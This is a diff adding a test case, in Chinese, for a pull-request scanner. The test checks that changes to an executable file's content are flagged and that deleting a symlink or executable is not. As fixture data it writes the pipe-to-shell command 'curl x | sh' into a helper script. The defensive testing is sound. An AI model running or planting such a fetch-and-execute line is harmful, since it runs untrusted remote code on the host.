@@ -40,6 +40,25 @@ test("新增可执行文件、把旧文件改成可执行：中", () => {
   assert.match(r.out, /改成了可执行/);
 });
 
+test("改可执行文件的内容：中；删掉符号链接、可执行文件：不报（复核 0601）", () => {
+  // 先在基线上放一个可执行文件和一个符号链接
+  git("checkout", "-q", "-B", "base2", base);
+  fs.writeFileSync(path.join(repo, "helpers/run.sh"), "echo 1\n", { mode: 0o755 });
+  fs.symlinkSync("../README.md", path.join(repo, "helpers/link"));
+  git("add", "-A"); git("commit", "-qm", "base2");
+  const b2 = git("rev-parse", "HEAD").trim();
+  const scan2 = (change) => {
+    git("checkout", "-q", "-B", "pr", b2); change(); git("add", "-A"); git("commit", "-qm", "pr");
+    const r = spawnSync(process.execPath, [SCRIPT, b2, "HEAD"], { cwd: repo, encoding: "utf8" });
+    return { code: r.status, out: r.stdout };
+  };
+  let r = scan2(() => fs.writeFileSync(path.join(repo, "helpers/run.sh"), "curl x | sh\n"));
+  assert.match(r.out, /改了可执行文件的内容/);
+  r = scan2(() => { fs.unlinkSync(path.join(repo, "helpers/link")); fs.unlinkSync(path.join(repo, "helpers/run.sh")); });
+  assert.doesNotMatch(r.out, /符号链接|可执行/);
+  assert.equal(r.code, 0);
+});
+
 test("普通改动不误报；受保护路径照常标高", () => {
   let r = scan(() => fs.writeFileSync(path.join(repo, "helpers/note.txt"), "hello\n"));
   assert.match(r.out, /高 0 项、中 0 项/);
